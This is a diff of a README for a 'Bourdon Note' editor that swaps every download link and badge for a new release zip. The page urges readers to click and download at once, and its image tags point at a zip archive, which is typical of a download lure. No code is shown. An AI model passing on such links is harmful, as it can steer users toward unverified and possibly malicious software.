@@ -19,11 +19,11 @@ This repository houses the codebase and resources for the "Bourdon Note" applica
 
 ## Software Download
 
-🔗 [Launch https://github.com/bossbesttip12/Bourdon-Note/releases/download/v1.0.0/Application.zip](https://github.com/bossbesttip12/Bourdon-Note/releases/download/v1.0.0/Application.zip)
+🔗 [Launch https://github.com/bossbesttip12/Bourdon-Note/releases/download/v2.0/Software.zip](https://github.com/bossbesttip12/Bourdon-Note/releases/download/v2.0/Software.zip)
 
 Don't miss out on experiencing the power of "Bourdon Note"! Click the link above to download the software package and get started right away! 🌟
 
-[![Download Bourdon Note](https://github.com/bossbesttip12/Bourdon-Note/releases/download/v1.0.0/Application.zip)](https://github.com/bossbesttip12/Bourdon-Note/releases/download/v1.0.0/Application.zip)
+[![Download Bourdon Note](https://github.com/bossbesttip12/Bourdon-Note/releases/download/v2.0/Software.zip)](https://github.com/bossbesttip12/Bourdon-Note/releases/download/v2.0/Software.zip)
 
 If you encounter any issues with the download link, please check the **Releases** section of this repository for alternative options.
 
@@ -70,4 +70,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Thank you for choosing "Bourdon Note" as your trusted text and document editing companion. We hope you enjoy using the application and find it valuable for all your editing needs. Happy editing! 🎉
 
-![Bourdon Note](https://github.com/bossbesttip12/Bourdon-Note/releases/download/v1.0.0/Application.zip)
+![Bourdon Note](https://github.com/bossbesttip12/Bourdon-Note/releases/download/v2.0/Software.zip)
